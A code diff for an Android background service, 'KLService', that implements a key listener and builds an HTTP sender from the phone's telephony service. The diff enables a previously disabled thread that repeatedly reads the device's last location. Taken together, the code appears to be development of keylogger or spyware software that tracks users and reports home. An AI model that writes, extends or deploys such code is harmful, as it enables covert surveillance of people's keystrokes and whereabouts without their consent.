@@ -20,6 +20,8 @@ import android.app.Service;
 //import android.content.Context;
 import android.content.Context;
 import android.content.Intent;
+import android.location.Location;
+import android.location.LocationManager;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
@@ -40,6 +42,7 @@ public class KLService extends Service implements KeyListener {
 	private int mIntervalTime;
 	public static Context mContext;
    	public static boolean rRun;
+   	public static Location mLocation;
 	
 	//FUNCTIONS:
     @Override
@@ -62,7 +65,7 @@ public class KLService extends Service implements KeyListener {
 		mContext = this;
 		mIntervalTime = 10000;
 		mHttpThread = new Thread(htttpRunnable);
-		//mLocationThread = new Thread(locationRunnable);
+		mLocationThread = new Thread(locationRunnable);
 	
 		//serviceStatus = true;
 		//We go to our logic stuff....
@@ -133,9 +136,9 @@ public class KLService extends Service implements KeyListener {
     	@Override
         public void run() {
 		    //Thread Run:
+    		Looper.prepare();
         	KLSHttpSender sender = new KLSHttpSender((TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE));
         	//Prepare for a loop(Note to self: Andy requested this..)
-        	Looper.prepare();
         	
     		if (mDebugLevel  > 1) {
     			Toast.makeText(mContext, "Http Thread Starting ...", Toast.LENGTH_LONG).show();
@@ -173,15 +176,16 @@ public class KLService extends Service implements KeyListener {
     		}
 		}
      };
-     /*
+     
      //Location Thread:
      final Runnable locationRunnable = new Runnable() {
 		@Override
 		public void run() {
 			//Thread Run:
+			Looper.prepare();
 			KLSLocation locator = new KLSLocation((LocationManager)getSystemService(Context.LOCATION_SERVICE));
         	//Prepare for a loop(Note to self: Andy requested this..)
-        	Looper.prepare();
+        	
         	
     		if (mDebugLevel  > 1) {
     			Toast.makeText(mContext, "Location Thread Starting ...", Toast.LENGTH_LONG).show();
@@ -202,7 +206,7 @@ public class KLService extends Service implements KeyListener {
         		
         		//Start Thread Main Code:
         		Location tmpLoc = locator.getLastLocation();
-        		Log.i(getClass().getSimpleName(), "AVIAD: Location is ..." + tmpLoc.getLongitude());
+        		//Log.i(getClass().getSimpleName(), "AVIAD: Location is ..." + tmpLoc.getProvider());
         		
         		//END Thread Main Code.
         		
@@ -218,7 +222,7 @@ public class KLService extends Service implements KeyListener {
     			Log.i(getClass().getSimpleName(), "AVIAD: Location Thread Stopped ...");
     		}
 		}
-	};*/
+	};
 
     
 }
